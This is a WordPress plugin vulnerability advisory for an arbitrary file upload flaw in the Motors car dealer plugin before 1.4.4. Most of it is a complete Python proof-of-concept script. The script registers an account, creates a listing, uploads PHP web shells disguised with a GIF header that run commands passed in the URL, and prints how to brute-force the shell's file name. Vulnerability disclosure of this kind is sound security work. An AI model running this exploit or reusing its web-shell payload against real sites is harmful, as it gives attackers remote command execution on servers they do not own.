## WordPress Plugin Vulnerabilities

# Motors - Car Dealer, Classifieds & Listing < 1.4.4 - Arbitrary File Upload

### Description

The plugin does not properly validate uploaded files for dangerous file types (such as .php) in an AJAX action, allowing an attacker to sign up on a victim's WordPress instance, upload a malicious PHP file and attempt to launch a brute-force attack to discover the uploaded payload.

### Proof of Concept

This PoC was tested against a local WordPress 6.1 instance with the vulnerable plugin installed in it's default configuration.
You should only need to change the BASE\_URL, the rest should work as is.
import sys
import io
import random
import string
import binascii
import datetime
import requests
BASE\_URL = "http://127.0.0.1:7777"
ADMIN\_AJAX\_URL = BASE\_URL + "/wp-admin/admin-ajax.php"
USERNAME = "".join(random.choices(string.ascii\_lowercase, k=10))
PASSWORD = "".join(random.choices(string.ascii\_lowercase, k=16))
EMAIL = USERNAME + "@example.com"
PAYLOAD = b"<?php passthru($\_GET['cmd']); ?>"
GIF\_PREFIX = binascii.unhexlify("4749463839610f000f00f30d0000")
with requests.Session() as session:
# Register a new user.
print(f"[\*] Registering new user: {USERNAME}:{PASSWORD} ...")
try:
response = session.post(
ADMIN\_AJAX\_URL,
data={
"action": "stm\_custom\_register",
"stm\_nickname": USERNAME,
"stm\_user\_mail": EMAIL,
"stm\_user\_password": PASSWORD,
},
)
message = response.json()["message"]
if "Congratulations! You have been successfully registered" in message:
print("[+] Successfully registered new user.")
if "Sorry, that username already exists!" in message:
print("[-] Registration failed, user already exists.")
exit(1)
except Exception as e:
print("[-] Registration failed!")
exit(1)
# Authenticate
try:
response = session.post(
ADMIN\_AJAX\_URL,
data={
"action": "stm\_custom\_login",
"stm\_user\_login": USERNAME,
"stm\_user\_password": PASSWORD,
},
)
if "Successfully logged in" in response.json()["message"]:
print("[+] Authenticated.")
except Exception as e:
print("[-] Login failed")
print(e)
exit(1)
# Create listing
try:
print("[\*] Creating car listing...")
response = session.post(
ADMIN\_AJAX\_URL,
data={
"action": "stm\_ajax\_add\_a\_car",
"stm\_car\_main\_title": "".join(
random.choices(string.ascii\_letters, k=12)
),
"stm\_car\_price": str(random.randint(1000, 99999)),
},
)
post\_id = response.json()["post\_id"]
print(f"[+] Car listing created: post\_id={post\_id}")
except Exception as e:
print("[-] Failed to add listing.")
exit(1)
try:
print("[\*] Uploading payload...", file=sys.stderr)
# ext = random.choice(["php", "gif"])
response = session.post(
ADMIN\_AJAX\_URL,
data={
"action": "stm\_ajax\_add\_a\_car\_media",
"post\_id": post\_id,
"stm\_edit": "update",
},
files={
"files[0]": ("payload-1.php", io.BytesIO(GIF\_PREFIX + PAYLOAD)),
"files[1]": ("payload-2.php", io.BytesIO(GIF\_PREFIX + PAYLOAD)),
"files[2]": ("payload-3.php", io.BytesIO(GIF\_PREFIX + PAYLOAD)),
"files[3]": ("payload-4.php", io.BytesIO(GIF\_PREFIX + PAYLOAD)),
"files[4]": ("payload-5.php", io.BytesIO(GIF\_PREFIX + PAYLOAD)),
},
)
if "Car updated" in response.json()["message"]:
print("[+] Payload uploaded")
print(f"[\*] You need to bruteforce 5 chars to discover your payload:")
print(f"[\*] Charset: 23456789ABCDEFHJKLMNPRTVWXYZabcdefghijklmnopqrstuvwxyz")
date\_dir = datetime.datetime.now().strftime("%Y/%m")
print(f"[\*] /wp-content/uploads/{date\_dir}/post\_id\_{post\_id}\_?????.php")
except Exception as e:
print(response.json())
print("[-] Failed to upload payload.")
exit(1)
